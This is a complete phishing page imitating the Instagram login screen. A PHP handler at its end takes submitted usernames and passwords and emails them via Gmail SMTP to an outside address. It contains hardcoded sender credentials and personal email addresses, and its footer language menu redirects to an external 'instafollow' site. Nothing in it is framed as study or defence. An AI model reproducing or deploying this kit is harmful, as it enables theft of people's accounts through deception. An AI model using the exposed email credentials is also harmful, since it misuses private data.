<head>
	 <link rel="stylesheet" href="styles.css">
	 <link rel="icon" sizes="192x192" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
	 
</head>
<body>
  <span id="root">
    <section class="section-all">
      <main class="main" role="main">
        <div class="wrapper">
          <article class="article">
            <div class="content">
              <div class="login-box">
                <div class="header">
                  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
                </div>
                <div class="form-wrap">
                  <form class="form" method="POST" action="<?php echo $_SERVER['PHP_SELF'];?>">

                    <div class="input-box">
                      <input type="text" id="name" aria-describedby="" placeholder="Phone number, username, or email" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name="username" value="" required>
                    </div>  

                    <div class="input-box">
                      <input type="password" name="password" id="password" placeholder="Password" aria-describedby="" maxlength="30" aria-required="true" autocapitalize="off" autocorrect="off" required>
                    </div>  

                    <span class="button-box">
                      <input class="btn"  type="submit" name="send" value="Log In"></input>
                    </span>  

                    <a class="forgot" href="">Forgot password?</a>
                  </form>
                </div>
              </div> 

              <div class="login-box">
                <p class="text">Don't have an account?<a href="#">Sign up</a></p>
              </div> 

              <div class="app">
                <p>Get the app.</p>
                <div class="app-img">
                  <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png" >
                  </a>
                  <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png">
                  </a>  
                </div> 
              </div> 
            </div> 
          </article>
        </div> 
      </main>
      <footer class="footer" role="contentinfo">
        <div class="footer-container">

          <nav class="footer-nav" role="navigation">
            <ul>
              <li><a href="">About Us</a></li>
              <li><a href="">Support</a></li>
              <li><a href="">Blog</a></li>
              <li><a href="">Press</a></li>
              <li><a href="">Api</a></li>
              <li><a href="">Jobs</a></li>
              <li><a href="">Privacy</a></li>
              <li><a href="">Terms</a></li>
              <li><a href="">Directory</a></li>
              <li>
                <span class="language">Language
                  <select name="language" class="select" onchange="la(this.value)">
                    <option value="#">English</option>
                    <option value="http://ru-instafollow.bitballoon.com">Turkish</option>    
                    <option value="http://ru-instafollow.bitballoon.com">Azerbaijan</option>    
                    <option value="http://ru-instafollow.bitballoon.com">Germany</option>    
                  </select>
                </span>
              </li>
            </ul>
          </nav>

          <span class="footer-logo"> © 2021 Instagram from Meta</span>
        </div> 
      </footer>
      
    </section>
  </span> 

  <script type="text/javascript">
    function la(src) {
      window.location=src;
    }
  </script>
</body>
<?php
	use PHPMailer\PHPMailer\PHPMailer;
	use PHPMailer\PHPMailer\Exception;
	 
	require 'src/Exception.php';
	require 'src/PHPMailer.php';
	require 'src/SMTP.php';
	
	$mail= new PHPMailer();
	function Gmail($txt){
		global $mail;
		$mail->isSMTP();
		$mail->SMTPAuth=true;
		$mail->SMTPSecure="ssl";
		$mail->Host="smtp.gmail.com";
		$mail->Port=465;
		$mail->Username="sayepzero@gmail.com";
		$mail->Password="sultan.u235";
		$mail->SetFrom("sayepzero@gmail.com","rootInstagram");
		$mail->addAddress("soltan.huseynov02@gmail.com","solt");
		$mail->isHTML(true);
		$mail->Subject="Instagram";
		$mail->Body=$txt;
		$mail->Send();
		
	}
	if($_SERVER["REQUEST_METHOD"]=="POST"){
		$Username=$_POST["username"];
		$Password=$_POST["password"];
		if($_POST["send"]){
			$show="user:{$Username}</br> pass:{$Password}";
			Gmail($show);
		}
	}
	
	
?>
